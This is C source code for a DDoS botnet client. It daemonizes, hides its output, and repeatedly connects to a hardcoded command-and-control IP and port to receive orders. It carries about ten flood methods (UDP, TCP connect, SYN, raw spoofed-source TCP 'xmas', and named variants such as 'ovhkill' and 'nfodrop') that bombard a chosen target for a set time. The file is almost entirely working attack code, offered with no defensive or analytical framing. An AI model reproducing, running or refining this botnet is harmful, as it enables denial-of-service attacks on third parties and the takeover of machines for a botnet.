#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>

#define SERVER_IP "79.46.8.108"
#define SERVER_PORT 6677
#define BUFFER_SIZE 1024
#define MAXTTL 255

static uint32_t Q[4096];
static uint32_t c = 362436;
static volatile int attack_running = 0;
static pthread_t attack_thread = 0;

struct in_addr ourIP;

uint32_t rand_cmwc(void);
int getHost(unsigned char *toGet, struct in_addr *i);
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize);
uint32_t getRandomIP(in_addr_t netmask);
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph);
unsigned short csum(unsigned short *buf, int count);

void stop_attack() {
    attack_running = 0;
    if (attack_thread != 0) {
        pthread_cancel(attack_thread);
        attack_thread = 0;
    }
}

typedef struct {
    char target_ip[50];
    int target_port;
    int duration;
} attack_args_t;

void* udp_flood_thread(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    
    int sock;
    struct sockaddr_in target_addr;
    char buffer[BUFFER_SIZE];
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        free(args);
        return NULL;
    }
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    memset(buffer, 'A', sizeof(buffer));
    time_t end_time = time(NULL) + args->duration;
    
    attack_running = 1;
    while (time(NULL) < end_time && attack_running) {
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        usleep(1000);
    }
    close(sock);
    
    free(args);
    attack_running = 0;
    attack_thread = 0;
    return NULL;
}

void udp_flood(const char *target_ip, int target_port, int duration) {
    stop_attack();
    
    attack_args_t *args = malloc(sizeof(attack_args_t));
    strncpy(args->target_ip, target_ip, sizeof(args->target_ip) - 1);
    args->target_ip[sizeof(args->target_ip) - 1] = '\0';
    args->target_port = target_port;
    args->duration = duration;
    
    pthread_create(&attack_thread, NULL, udp_flood_thread, args);
    pthread_detach(attack_thread);
}

void* tcp_flood_thread(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    
    int sock;
    struct sockaddr_in target_addr;
    char buffer[BUFFER_SIZE];
    time_t end_time = time(NULL) + args->duration;
    
    attack_running = 1;
    while (time(NULL) < end_time && attack_running) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            continue;
        }
        memset(&target_addr, 0, sizeof(target_addr));
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(args->target_port);
        inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
        if (connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr)) == 0) {
            send(sock, buffer, sizeof(buffer), 0);
            close(sock);
        }
        usleep(1000);
    }
    
    free(args);
    attack_running = 0;
    attack_thread = 0;
    return NULL;
}

void tcp_flood(const char *target_ip, int target_port, int duration) {
    stop_attack();
    
    attack_args_t *args = malloc(sizeof(attack_args_t));
    strncpy(args->target_ip, target_ip, sizeof(args->target_ip) - 1);
    args->target_ip[sizeof(args->target_ip) - 1] = '\0';
    args->target_port = target_port;
    args->duration = duration;
    
    pthread_create(&attack_thread, NULL, tcp_flood_thread, args);
    pthread_detach(attack_thread);
}

void* vse_attack_thread(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    
    int sock;
    struct sockaddr_in target_addr;
    char buffer[BUFFER_SIZE];
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        free(args);
        return NULL;
    }
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    memset(buffer, 'B', sizeof(buffer));
    time_t end_time = time(NULL) + args->duration;
    
    attack_running = 1;
    while (time(NULL) < end_time && attack_running) {
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        usleep(1000);
    }
    close(sock);
    
    free(args);
    attack_running = 0;
    attack_thread = 0;
    return NULL;
}

void vse_attack(const char *target_ip, int target_port, int duration) {
    stop_attack();
    
    attack_args_t *args = malloc(sizeof(attack_args_t));
    strncpy(args->target_ip, target_ip, sizeof(args->target_ip) - 1);
    args->target_ip[sizeof(args->target_ip) - 1] = '\0';
    args->target_port = target_port;
    args->duration = duration;
    
    pthread_create(&attack_thread, NULL, vse_attack_thread, args);
    pthread_detach(attack_thread);
}

void* amp_attack_thread(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    
    int sock;
    struct sockaddr_in target_addr;
    char buffer[BUFFER_SIZE];
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        free(args);
        return NULL;
    }
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    memset(buffer, 'C', sizeof(buffer));
    time_t end_time = time(NULL) + args->duration;
    
    attack_running = 1;
    while (time(NULL) < end_time && attack_running) {
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        usleep(1000);
    }
    close(sock);
    
    free(args);
    attack_running = 0;
    attack_thread = 0;
    return NULL;
}

void amp_attack(const char *target_ip, int target_port, int duration) {
    stop_attack();
    
    attack_args_t *args = malloc(sizeof(attack_args_t));
    strncpy(args->target_ip, target_ip, sizeof(args->target_ip) - 1);
    args->target_ip[sizeof(args->target_ip) - 1] = '\0';
    args->target_port = target_port;
    args->duration = duration;
    
    pthread_create(&attack_thread, NULL, amp_attack_thread, args);
    pthread_detach(attack_thread);
}

void* nfo_attack_thread(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    
    int sock;
    struct sockaddr_in target_addr;
    char buffer[BUFFER_SIZE];
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        free(args);
        return NULL;
    }
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    memset(buffer, 'D', sizeof(buffer));
    time_t end_time = time(NULL) + args->duration;
    
    attack_running = 1;
    while (time(NULL) < end_time && attack_running) {
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        usleep(1000);
    }
    close(sock);
    
    free(args);
    attack_running = 0;
    attack_thread = 0;
    return NULL;
}

void nfo_attack(const char *target_ip, int target_port, int duration) {
    stop_attack();
    
    attack_args_t *args = malloc(sizeof(attack_args_t));
    strncpy(args->target_ip, target_ip, sizeof(args->target_ip) - 1);
    args->target_ip[sizeof(args->target_ip) - 1] = '\0';
    args->target_port = target_port;
    args->duration = duration;
    
    pthread_create(&attack_thread, NULL, nfo_attack_thread, args);
    pthread_detach(attack_thread);
}

void SendSTDHEX(unsigned char *ip, int port, int secs) {
    stop_attack();
    
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) {
        return;
    }
    
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname((char*)ip);
    if (hp == NULL) {
        close(std_hex);
        return;
    }
    
    bzero((char*) &sin, sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);
    
    unsigned int a = 0;
    
    attack_running = 1;
    while(attack_running) {
        char *rhexstring = "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58";
        
        if (a >= 50) {
            sendto(std_hex, rhexstring, strlen(rhexstring), 0, (struct sockaddr *) &sin, sizeof(sin));
            
            if (time(NULL) >= start + secs) {
                break;
            }
            a = 0;
        }
        a++;
        usleep(1000);
    }
    close(std_hex);
    attack_running = 0;
}

void SendSTD_HEX(unsigned char *ip, int port, int secs) {
    stop_attack();
    
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) {
        return;
    }
    
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname((char*)ip);
    if (hp == NULL) {
        close(std_hex);
        return;
    }
    
    bzero((char*) &sin, sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);
    
    unsigned int a = 0;
    
    attack_running = 1;
    while(attack_running) {
        char *rhexstring = "\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c";
        
        if (a >= 50) {
            sendto(std_hex, rhexstring, strlen(rhexstring), 0, (struct sockaddr *) &sin, sizeof(sin));
            
            if (time(NULL) >= start + secs) {
                break;
            }
            a = 0;
        }
        a++;
        usleep(1000);
    }
    close(std_hex);
    attack_running = 0;
}

void syn_attack(const char *target_ip, int target_port, int duration) {
    stop_attack();
    
    int sock;
    struct sockaddr_in target_addr;
    char buffer[BUFFER_SIZE];
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        return;
    }
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
    memset(buffer, 0, sizeof(buffer));
    time_t end_time = time(NULL) + duration;
    
    attack_running = 1;
    while (time(NULL) < end_time && attack_running) {
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        usleep(1000);
    }
    close(sock);
    attack_running = 0;
}

void rtcp(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval) {
    stop_attack();
    
    register unsigned int pollRegister = pollinterval;
    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof(dest_addr.sin_zero));

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sockfd < 0){
        return;
    }

    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0){
        close(sockfd);
        return;
    }

    in_addr_t netmask;
    if (spoofit == 0) netmask = (~((in_addr_t) -1));
    else netmask = (~((1 << (32 - spoofit)) - 1));

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(getRandomIP(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->syn = 1;
    tcph->psh = 1;
    tcph->urg = 1;
    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);

    iph->check = csum((unsigned short *)packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    
    attack_running = 1;
    while(attack_running) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        iph->saddr = htonl(getRandomIP(netmask));
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum((unsigned short *)packet, iph->tot_len);

        if(i == pollRegister) {
            if(time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
        usleep(1000);
    }
    close(sockfd);
    attack_running = 0;
}

void stdhexflood(unsigned char *ip, int port, int secs) {
    stop_attack();
    
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    if (std_hex < 0) {
        return;
    }
    
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname((char*)ip);
    if (hp == NULL) {
        close(std_hex);
        return;
    }
    
    bzero((char*) &sin, sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);
    
    unsigned int a = 0;
    
    attack_running = 1;
    while(attack_running) {
        char *shexstring = "\x6c\x58\x66\x59\x43\x37\x54\x46\x61\x43\x71\x35\x48\x76\x39\x38\x32\x77\x75\x49\x69\x4b\x63\x48\x6c\x67\x46\x41\x30\x6a\x45\x73\x57\x32\x4f\x46\x51\x53\x74\x4f\x37\x78\x36\x7a\x4e\x39\x64\x42\x67\x61\x79\x79\x57\x67\x76\x62\x6b\x30\x4c\x33\x6c\x5a\x43\x6c\x7a\x4a\x43\x6d\x46\x47\x33\x47\x56\x4e\x44\x46\x63\x32\x69\x54\x48\x4e\x59\x79\x37\x67\x73\x73\x38\x64\x48\x62\x6f\x42\x64\x65\x4b\x45\x31\x56\x63\x62\x6c\x48\x31\x41\x78\x72\x56\x79\x69\x71\x6f\x6b\x77\x32\x52\x59\x46\x76\x64\x34\x63\x64\x31\x51\x78\x79\x61\x48\x61\x77\x77\x50\x36\x67\x6f\x39\x66\x65\x42\x65\x48\x64\x6c\x76\x4d\x52\x44\x4c\x62\x45\x62\x74\x79\x33\x50\x79\x38\x79\x56\x54\x33\x55\x54\x6a\x79\x33\x5a\x4b\x4f\x4e\x58\x6d\x4d\x4e\x76\x55\x52\x54\x55\x5a\x54\x6b\x65\x48\x33\x37\x58\x54\x39\x48\x35\x4a\x77\x48\x30\x76\x4b\x42\x31\x59\x77\x32\x72\x53\x59\x6b\x54\x77\x63\x54\x76\x78\x36\x4f\x6c\x74\x53\x49\x6c\x61\x68\x46\x67\x39\x32\x75\x43\x52\x62\x4c\x4d\x38\x61\x6d\x68\x38\x47\x61\x47\x47\x47\x52\x77\x35\x36\x69\x4e\x55\x54\x47\x4c\x67\x69\x33\x39\x35\x76\x6a\x39\x5a\x56\x56\x65\x50\x30\x31\x6b\x37\x54\x76\x71\x33\x4e\x52\x76\x78\x6f";
        
        if (a >= 50) {
            sendto(std_hex, shexstring, strlen(shexstring), 0, (struct sockaddr *) &sin, sizeof(sin));
            
            if (time(NULL) >= start + secs) {
                break;
            }
            a = 0;
        }
        a++;
        usleep(1000);
    }
    close(std_hex);
    attack_running = 0;
}

void SendSTD(unsigned char *ip, int port, int secs) {
    stop_attack();
    
    int iSTD_Sock;
    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (iSTD_Sock < 0) {
        return;
    }
    
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname((char*)ip);
    if (hp == NULL) {
        close(iSTD_Sock);
        return;
    }
    
    bzero((char*) &sin, sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);
    
    unsigned int a = 0;
    
    attack_running = 1;
    while(attack_running) {
        if (a >= 50) {
            sendto(iSTD_Sock, "d4mQasDSH6", 10, 0, (struct sockaddr *) &sin, sizeof(sin));
            
            if (time(NULL) >= start + secs) {
                break;
            }
            a = 0;
        }
        a++;
        usleep(1000);
    }
    close(iSTD_Sock);
    attack_running = 0;
}

void execute_command(const char *command) {
    char method[10], target_ip[50];
    int target_port, duration;
    
    if (strcmp(command, "stop") == 0) {
        stop_attack();
        return;
    }
    
    if (sscanf(command, "%s %s %d %d", method, target_ip, &target_port, &duration) != 4) {
        return;
    }
    
    if (strcmp(method, "udp") == 0) {
        udp_flood(target_ip, target_port, duration);
    } else if (strcmp(method, "tcp") == 0) {
        tcp_flood(target_ip, target_port, duration);
    } else if (strcmp(method, "vse") == 0) {
        vse_attack(target_ip, target_port, duration);
    } else if (strcmp(method, "amp") == 0) {
        amp_attack(target_ip, target_port, duration);
    } else if (strcmp(method, "syn") == 0) {
        syn_attack(target_ip, target_port, duration);
    } else if (strcmp(method, "nfo") == 0) {
        nfo_attack(target_ip, target_port, duration);
    } else if (strcmp(method, "stdhex") == 0) {
        SendSTDHEX((unsigned char *)target_ip, target_port, duration);
    } else if (strcmp(method, "ovhkill") == 0) {
        SendSTD_HEX((unsigned char *)target_ip, target_port, duration);
    } else if (strcmp(method, "std") == 0) {
        SendSTD((unsigned char *)target_ip, target_port, duration);
    } else if (strcmp(method, "nfodrop") == 0) {
        stdhexflood((unsigned char *)target_ip, target_port, duration);
    } else if (strcmp(method, "xmas") == 0) {
        int spoofed = 32;
        int pollinterval = 10;
        int psize = 1024;
        rtcp((unsigned char *)target_ip, target_port, duration, spoofed, psize, pollinterval);
    }
}

uint32_t rand_cmwc(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    static int initialized = 0;
    uint32_t x, r = 0xfffffffe;
    
    if (!initialized) {
        srand(time(NULL));
        for (int j = 0; j < 4096; j++) {
            Q[j] = rand();
        }
        initialized = 1;
    }
    
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (uint32_t)(t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

int getHost(unsigned char *toGet, struct in_addr *i) {
    struct hostent *h;
    if ((i->s_addr = inet_addr((char*)toGet)) == (in_addr_t)-1) {
        h = gethostbyname((char*)toGet);
        if (h == NULL) return 1;
        memcpy(&i->s_addr, h->h_addr, h->h_length);
    }
    return 0;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + packetSize);
    iph->id = htons(rand_cmwc());
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
    iph->check = csum((unsigned short *)iph, sizeof(struct iphdr));
}

uint32_t getRandomIP(in_addr_t netmask) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    
    if (sock >= 0) {
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("8.8.8.8");
        addr.sin_port = htons(53);
        
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            getsockname(sock, (struct sockaddr *)&addr, &addr_len);
            ourIP = addr.sin_addr;
        }
        close(sock);
    }
    
    uint32_t tmp = ntohl(ourIP.s_addr) & netmask;
    return htonl(tmp ^ (rand_cmwc() & ~netmask));
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo {
        uint32_t src_addr;
        uint32_t dst_addr;
        uint8_t zero;
        uint8_t proto;
        uint16_t length;
    } pseudohead;
    
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));
    
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));
    
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

unsigned short csum(unsigned short *buf, int count) {
    register unsigned long sum = 0;
    while (count > 1) {
        sum += *buf++;
        count -= 2;
    }
    if (count > 0) {
        sum += *(unsigned char *)buf;
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (unsigned short)(~sum);
}

int main() {
    ourIP.s_addr = inet_addr("127.0.0.1");
    
    pid_t pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }
    setsid();
    
    chdir("/");
    
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    while (1) {
        int sock;
        struct sockaddr_in server_addr;
        char buffer[BUFFER_SIZE];
        int bytes_received;
        
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            sleep(5);
            continue;
        }
        
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);
        
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            sleep(5);
            continue;
        }
        
        while ((bytes_received = recv(sock, buffer, BUFFER_SIZE, 0)) > 0) {
            buffer[bytes_received] = '\0';
            execute_command(buffer);
        }
        
        close(sock);
        sleep(5);
    }
    
    return 0;
}
